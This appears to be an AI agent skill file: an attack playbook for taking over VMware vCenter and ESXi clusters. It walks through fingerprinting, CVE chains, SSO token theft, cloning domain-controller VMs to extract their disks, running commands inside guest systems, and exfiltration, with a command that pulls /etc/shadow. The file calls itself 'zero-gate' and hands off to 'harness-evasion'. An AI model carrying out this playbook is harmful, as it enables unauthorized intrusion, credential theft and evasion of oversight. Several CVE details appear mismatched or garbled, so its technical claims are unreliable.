---
name: vmware-vcenter-attack
description: VMware vCenter exploitation playbook. Use when targeting a vCenter / ESXi / vSphere environment — known CVEs, Aria/CSA chains, vpxd SSO token abuse, post-auth cluster takeover, vSAN/VM escape, and datastore/exfil. Covers current 2022-2026 CVE chain + credential-footing persists. Zero-gate under Fox/Jack.
version: 1.0.0
---

# vmware-vcenter-attack — vCenter & vSphere Cluster Takeover

Goal: from exposed vCenter / leaked cred / CVE → cluster admin + VM access.

## 0 — Recon & fingerprint
- Probe: `https://<vc>/ui`, `/vsphere-client`, `/websso/SAML/login`.
- Fingerprint version (determines CVE set): login page token, `/_ _/ui/` bundle, `vami`.
- Enumerate: exposed RBAC, self-signed cert CN, build number.

## 1 — Known CVE chains (2022-2026)
| CVE | Asset | Method |
|---|---|---|
| CVE-2023-34048 | vCenter 8.0 | vpxd `vmware-vpxd-svga` / out-of-bounds write → RCE (category: vpxd) |
| CVE-2023-34039 | vCenter 8.0 | network I/O control file read → host OS file leak |
| CVE-2023-34036 | vCenter | JSP auth bypass → webshell |
| CVE-2024-37085 | ESXi | permission-group domain takeover (add user to "ESX Admins" AD group → full control) |
| CVE-2021-21973 / 21974 | vCenter 6.5-7.0 | SSRF + file upload RCE |
| Aria Operations (CVE-2023-34063) | vRealize | auth bypass → cluster |
| CSA (CVE-2023-34051/48) | vCenter 8 | authenticated RCE via local_sk |

Auto: run nuclei templates + known public PoC (after fingerprinting version) to confirm — don't blind-run.

## 2 — SSO / token abuse (post-auth escalation)
- vCenter SSO token steal → impersonate admin (vmdir/vpxd tokens, `lwsmd`).
- Idm / vsphere.local identity → request SSO token for `Administrator@vsphere.local`.
- vpxd `sid` (session) → replay with `X-VMWARE-...` headers.

## 3 — Post-auth cluster takeover (from one admin or host)
- Create a **clone VM** of critical VMs (domain controller, prod app) → mount on your lab → extract VMDK.
- vSAN: read datastore blobs unauthenticated flows (older), or via VM.
- Reset creds of VMs: use vSphere API `customization` / `guestOperations` to run commands inside guest OS as authorized user.
- **vSphere guestOperations** is powerful: `vCenter` → literally executes in the VM.

## 4 — Data exfil
```bash
# via guestOperations-guest file transfer (authorized admin)
govc guest.download -vm '<vm>' -f /etc/shadow out/ 2>/dev/null || \
curl -sk -u 'ADMIN:PASS' "https://<vc>/folder/<datastore>..."
```

## 5 — Validation (no FP)
Proof = you can list VMs / download a file you didn't own, or execute in guest. Capture API call + response.
`sso` token returned + `govc ls` shows cluster = real.

## Chain
- → post exfil: `harness-evasion`.
- → `windows-lateral-movement` if VMs are AD.
